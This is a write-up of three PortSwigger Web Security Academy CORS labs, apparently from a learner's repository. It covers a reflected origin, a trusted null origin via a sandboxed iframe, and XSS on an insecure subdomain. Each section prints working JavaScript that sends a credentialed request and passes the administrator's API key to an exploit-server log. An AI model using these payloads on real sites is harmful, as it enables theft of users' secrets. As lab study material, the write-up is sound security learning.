# CORS : It stands for Cross Origin Resource sharing. It's browser security feature that decides wheather one websites is allowed to access data from another website. 

# 1. CORS vulnerability with basic origin reflection : 

<img width="743" height="194" alt="image" src="https://github.com/user-attachments/assets/db1c788a-1ac5-49b9-aa75-f0b3063c2d4f" />

# Goal : To craft some js that uses CORS to retrive administrator API key and upload to exploit server. 

# Ingrediants : exploit server, submit solution, home, my-account and view details button. 

<img width="1221" height="604" alt="image" src="https://github.com/user-attachments/assets/0a612ec9-c40a-48df-a2a2-0aa68d376874" />

# Solving : 

- Let's login

<img width="1246" height="523" alt="image" src="https://github.com/user-attachments/assets/981a7776-de0d-4b3e-a7b5-3743497a8e4f" />

- Let's see the request and response of the get request and will add a random website in the origin and see if the application accepts it.

<img width="1002" height="364" alt="image" src="https://github.com/user-attachments/assets/a02da2e5-6eca-4894-8b0f-b99743357187" />

- Hence we can see application allows orbitary origin.

- Now we will write a script that will fetch the api key of the admin users.

<html>
<body>
<script>
 var xhr = new XMLHttpRequest();
var url = "https://0a0c00d603efc10f86e77b4a007b0086.web-security-academy.net"

xhr.onreadystatechange = function() {
if(xhr.readyState==XMLHttpRequest.DONE){
fetch("/log?key=" + xhr.responseText)
}
}
xhr.open('GET', url + "/accountDetails", true);
xhr.withCredentials =true;
xhr.send(null)

</script>
</body>
</html>

- It creates a request to /accountDetails and sends user cookies with the request (withCredentials = true) and it waits until the server sends back the response
- And it reads the response and send it to /log?key=.

<img width="1175" height="516" alt="image" src="https://github.com/user-attachments/assets/525ff3cb-cd2e-4cf7-9964-cc9fda1487dc" />

- We can see we got the key from the access log. 

<img width="1359" height="541" alt="image" src="https://github.com/user-attachments/assets/339a8e42-3af6-4b7f-8504-a2a96d1c53d1" />

<img width="1126" height="591" alt="image" src="https://github.com/user-attachments/assets/cd4672e0-f22d-479e-97c7-616b062d46c2" />

- Hence by submitting the key we solve the lab. 

<img width="1215" height="540" alt="image" src="https://github.com/user-attachments/assets/8caac09d-fdb7-44b4-bdf1-8c3080cc88c6" />

# ------------------------------------------------------------------------------


# 2. CORS vulnerability with trusted null origin.

<img width="798" height="190" alt="image" src="https://github.com/user-attachments/assets/3b1b9134-9aab-4ac2-99fc-21dbd23e5a1c" />

# Goal : Same as above 

# Ingrediants : Same as above. 

# Solving : 

- Like the last lab we will try that it is vulnerable to orbitary origin or not.

<img width="1053" height="354" alt="image" src="https://github.com/user-attachments/assets/54376345-04f4-41ef-9f96-cfcb84cd69ba" />

- We can see it is not accecpting the orbitary origin as can't see that in response.

- lets change the origin to null value and check and we can see the null in the response. 

<img width="1048" height="509" alt="image" src="https://github.com/user-attachments/assets/fefea6b1-08df-4221-aef9-e8ed0c362ad2" />

- As like the last lab we will write a script that will fetch the api key of the admin users.

<html>
<body>
<script>
 var xhr = new XMLHttpRequest();
var url = "https://0a750050046d0540804e036f0075005b.web-security-academy.net"

xhr.onreadystatechange = function() {
if(xhr.readyState==XMLHttpRequest.DONE){
fetch("/log?key=" + xhr.responseText)
}
}
xhr.open('GET', url + "/accountDetails", true);
xhr.withCredentials =true;
xhr.send(null)

</script>
</body>
</html>

- When we submit this srcipt it won't be get the api key for us that is because it accepts only the null origin. 

<img width="1347" height="359" alt="image" src="https://github.com/user-attachments/assets/a855f1cd-f044-43c4-9f40-ed877b887975" />

- Hence for that we will use the sandbox iframe so it would think that it is coming from the null origin. And we modify the code like following.

<html>
<body>
 <iframe style="display: none;"
  sandbox="allow-scripts" srcdoc="
<script>
 var xhr = new XMLHttpRequest();
var url = 'https://0a750050046d0540804e036f0075005b.web-security-academy.net'

xhr.onreadystatechange = function() {
if(xhr.readyState==XMLHttpRequest.DONE){
fetch('https://exploit-0ae8002c046105b78021020501560013.exploit-server.net/log?key=' + xhr.responseText)
}
}
xhr.open('GET', url + '/accountDetails', true);
xhr.withCredentials = true;
xhr.send(null);

</script></iframe>
</body>
</html>

- We are creating the iframe and sending the script through that so it would look like it is coming from the null origin.

<img width="1329" height="533" alt="image" src="https://github.com/user-attachments/assets/7dda45d7-a6fb-4f0c-bf5b-84b0d87d0ab5" />

- We can see it worked and fetched the api key of administrator user. Hence by submitting the key we will solve the lab. 

<img width="1151" height="657" alt="image" src="https://github.com/user-attachments/assets/899eb39e-65df-455a-8372-7547735a0fe3" />

<img width="1222" height="508" alt="image" src="https://github.com/user-attachments/assets/3fa24293-c4f2-4325-b925-d5ecaf288290" />

# ------------------------------------------------------------------------------

# 3. CORS vulnerability with trusted insecure protocols

<img width="748" height="223" alt="image" src="https://github.com/user-attachments/assets/a3811415-3b86-4596-a1cc-64108ad0aecc" />

# Goals : Same as above. 

# Ingrediants : Same as above. 

# Solving : 

- Let's start like the last lab and check if it accepts the orbitary or null origin.  

<img width="1212" height="541" alt="image" src="https://github.com/user-attachments/assets/107b6366-d2c8-47f1-bcc7-cc60acc96bba" />

<img width="985" height="447" alt="image" src="https://github.com/user-attachments/assets/fd5ee7ec-70bf-411e-9754-24405c9d9c8f" />

<img width="1067" height="487" alt="image" src="https://github.com/user-attachments/assets/55b2d273-5d0a-45d8-8a34-8ca3c9859e14" />

- We can see everything is failed hence we will try to inject the same origin of the site.

<img width="1068" height="321" alt="image" src="https://github.com/user-attachments/assets/9dad6a72-77a1-4481-9327-c877ff3105ef" />

- It worked now we will try subdomain to this domain. And it is also worked. 

<img width="1202" height="398" alt="image" src="https://github.com/user-attachments/assets/e3e4ffca-9043-4025-8229-67b6ddc2256d" />

- Let's check each button of the website and see if the subdomain changes for any of it.

<img width="1068" height="669" alt="image" src="https://github.com/user-attachments/assets/d6a379a7-7049-4f29-8ce1-38397a7b03bf" />

- We can see a subdomain is added to the domain when we checking the stock.

<img width="1075" height="347" alt="image" src="https://github.com/user-attachments/assets/1cb2c442-7f29-45d9-9663-0c70af98ab53" />

- Let's check if it is vulnerable to xss. However it shows an error the script is implemented properly.

<img width="1083" height="462" alt="image" src="https://github.com/user-attachments/assets/3ebcfe0b-e0b8-438a-b0ef-dcf6d38e649c" />

<img width="817" height="460" alt="image" src="https://github.com/user-attachments/assets/20083191-a804-4c22-ba40-f426fbd5229e" />

- Now we will write a xss script that will retrive the api key for us.

<html>
<body>
<script>
 document.location="http://stock.0a8c00f00336d23e848b916d00ea0036.web-security-academy.net/?productId=<script>var xhr = new XMLHttpRequest();var url = 'https://0a8c00f00336d23e848b916d00ea0036.web-security-academy.net';xhr.onreadystatechange = function(){if(xhr.readyState==XMLHttpRequest.DONE){fetch('https://exploit-0abf006303f5d24d840390d901a2000f.exploit-server.net/log?key=' %2b xhr.responseText)};};xhr.open('GET', url %2b '/accountDetails', true);xhr.withCredentials = true;xhr.send(null);%3c/script>&storeId=1"
</script> 
</body>
</html>

- We have inserted the malicious script by xss where it fetches the api key as like we did in the previous since it is xss we have url encoded the <,+ 

<img width="1219" height="459" alt="image" src="https://github.com/user-attachments/assets/56a37cbb-e1ad-40c6-bb15-dd9715a7d7bc" />

- Hence sumitting this script we got the api key. 

<img width="1358" height="496" alt="image" src="https://github.com/user-attachments/assets/20f67b52-ab2a-4e60-be11-8de1ac5da7c4" />

<img width="1058" height="629" alt="image" src="https://github.com/user-attachments/assets/00564058-6805-4ed0-8872-369e082afc9d" />

- Hence by submitting the api key we solve the lab.

<img width="1319" height="549" alt="image" src="https://github.com/user-attachments/assets/8c1325c6-ce5f-4218-8aed-ec5eac6fbe84" />

# ------------------------------------------------------------------------------
